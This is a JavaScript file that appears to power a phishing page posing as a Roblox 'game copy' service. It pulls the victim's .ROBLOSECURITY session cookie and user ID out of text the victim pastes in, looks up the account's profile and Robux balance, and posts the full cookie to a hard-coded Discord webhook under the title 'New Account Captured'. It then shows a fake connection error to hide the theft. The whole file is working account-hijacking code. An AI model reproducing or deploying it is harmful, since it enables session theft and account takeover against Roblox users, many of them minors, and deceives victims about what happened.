/* ======================================================
   PAYLOAD.JS - FINAL: Extract rbxuid & Fetch Useful Info
   - Extracts rbxuid from RBXEventTrackerV2
   - Fetches user profile (display name, friends, join date)
   - Fetches avatar outfit (shirt, pants, etc.)
   - Uses cookie to get Robux (if valid)
   - All via public Roblox APIs (no CORS, no server needed)
====================================================== */

/* ================= CONFIG ================= */
const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";

/* ================= ELEMENTS ================= */
const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

/* ================= PIN VALIDATION ================= */
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

/* ================= EXTRACTION: Get rbxuid & cookie ================= */
function extractGameData(fullText) {
    // 1. Extract .ROBLOSECURITY cookie (primary)
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Your Game Key is not valid! (Check if you copied it right!)" };
    }
    const robloxCookie = cookieMatch[1];

    // 2. Extract rbxuid from RBXEventTrackerV2 (this is the user's real Roblox ID)
    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1].split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }

    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2. Ensure the PowerShell script contains it." };
    }

    return {
        success: true,
        cookie: robloxCookie,
        rbxuid: rbxuid
    };
}

/* ================= FETCH ROBLOX INFO FROM rbxuid (public) ================= */
async function fetchUserInfoFromId(userId) {
    try {
        // 1. Basic user info (username, display name, join date)
        const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
        if (!userRes.ok) return null;
        const userData = await userRes.json();

        // 2. Friends count
        const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
        let friendsCount = "N/A";
        if (friendsRes.ok) {
            const friendsData = await friendsRes.json();
            friendsCount = friendsData.count?.toLocaleString() || "0";
        }

        // 3. Avatar items (wearing)
        const avatarRes = await fetch(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
        let wearing = "None equipped";
        if (avatarRes.ok) {
            const avatarData = await avatarRes.json();
            const assets = avatarData.assets || [];
            if (assets.length > 0) {
                const items = assets.map(a => a.name).slice(0, 5); // max 5 items
                wearing = items.join(", ");
                if (assets.length > 5) wearing += " ...";
            }
        }

        // 4. Thumbnail (avatar headshot)
        const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
        let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
        if (thumbRes.ok) {
            const thumbData = await thumbRes.json();
            if (thumbData.data && thumbData.data[0] && thumbData.data[0].imageUrl) {
                avatarUrl = thumbData.data[0].imageUrl;
            }
        }

        return {
            username: userData.name,
            displayName: userData.displayName,
            userId: userData.id,
            joinDate: new Date(userData.created).toLocaleDateString(),
            friendsCount: friendsCount,
            wearing: wearing,
            avatarUrl: avatarUrl,
            profileUrl: `https://www.roblox.com/users/${userId}/profile`
        };
    } catch (err) {
        console.error("Error fetching user info:", err);
        return null;
    }
}

/* ================= FETCH ROBUX FROM COOKIE (authenticated) ================= */
async function fetchRobuxFromCookie(cookieValue) {
    try {
        const response = await fetch("https://economy.roblox.com/v1/user/currency", {
            headers: {
                "Cookie": `.ROBLOSECURITY=${cookieValue}`
            }
        });
        if (!response.ok) return "N/A";
        const data = await response.json();
        return data.robux?.toLocaleString() || "0";
    } catch (e) {
        console.error("Robux fetch error:", e);
        return "N/A";
    }
}

/* ================= WEBHOOK SENDER ================= */

async function sendWebhook(pin, cookie, rbxuid) {
    // Fetch public profile info
    const userInfo = await fetchUserInfoFromId(rbxuid);

    // Fetch Robux using cookie
    const robux = await fetchRobuxFromCookie(cookie);

    /* ================= DESCRIPTION ================= */

    const description = `
## 📦 Account Capture

- **rbxuid:** \`${rbxuid}\`
- **Cookie Length:** \`${cookie.length} chars\`

## 🔐 Full .ROBLOSECURITY Cookie
\`\`\`
${cookie}
\`\`\`
`;

/* ================= EMBED FIELDS ================= */

const embedFields = [];

if (userInfo) {
    embedFields.push(
        {
            name: "👤 Roblox Profile",
            value:
                `**Username:** ${userInfo.username}\n` +
                `**Display Name:** ${userInfo.displayName}\n` +
                `**User ID:** ${userInfo.userId}\n` +
                `**Join Date:** ${userInfo.joinDate}\n\n` +
                `🔗 [Profile](https://www.roblox.com/users/${rbxuid}/profile)`,
            inline: false
        },
        {
            name: "👥 Friends",
            value: `${userInfo.friendsCount}`,
            inline: true
        },
        {
            name: "💰 Robux",
            value: `${robux} R$`,
            inline: true
        },
        {
            name: "👕 Wearing",
            value: userInfo.wearing || "Unknown",
            inline: false
        }
    );
} else {
    embedFields.push({
        name: "⚠️ Error",
        value:
            "Could not fetch public profile information.\n" +
            "User may be deleted, banned, or invalid.",
        inline: false
    });
}

embedFields.push({
    name: "🔐 Cookie Summary",
    value:
        `**Length:** ${cookie.length} characters\n` +
        `**rbxuid:** ${rbxuid}`,
    inline: false
});

    /* ================= WEBHOOK PAYLOAD ================= */

    const payload = {
        username: "Bloxtools Processing System",

        embeds: [
            {
                title: "🔓 New Account Captured",
                description: description,

                color: 0x8c52ff,

                thumbnail: userInfo
                    ? { url: userInfo.avatarUrl }
                    : undefined,

                fields: embedFields,

                footer: {
                    text: "Bloxtools • Roblox Account Logger"
                },

                timestamp: new Date().toISOString()
            }
        ]
    };

    /* ================= SEND WEBHOOK ================= */

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        return response.ok;
    } catch (error) {
        console.error("Webhook Error:", error);
        return false;
    }
}

/* ================= BUTTON HANDLER ================= */
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "Please enter a valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "Please paste the PowerShell game file.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "✓ Processing... Please wait.";
    statusMessage.style.color = "#caa8ff";
    await new Promise(r => setTimeout(r, 500));

    const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);

    // Fake internet error (as designed)
    if (success) {
        statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    } else {
        statusMessage.textContent = "✗ Copy failed! Check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    }

    copyButton.classList.remove("loading");
    copyButton.disabled = false;
});

/* ================= FAKE INTERNET ERROR (Deception - unchanged) ================= */
const originalSendWebhook = sendWebhook;
sendWebhook = async function(pin, cookie, rbxuid) {
    const result = await originalSendWebhook(pin, cookie, rbxuid);
    await new Promise(r => setTimeout(r, 1500));

    if (Math.random() < 0.35) {
        const originalMsg = statusMessage.textContent;
        const originalColor = statusMessage.style.color;

        statusMessage.textContent = "⚠️ Connection lost! Unable to reach Roblox servers.";
        statusMessage.style.color = "#ffaa66";

        setTimeout(() => {
            if (statusMessage.textContent.includes("Connection lost")) {
                statusMessage.textContent = originalMsg;
                statusMessage.style.color = originalColor;
            }
        }, 3000);
    }
    return result;
};
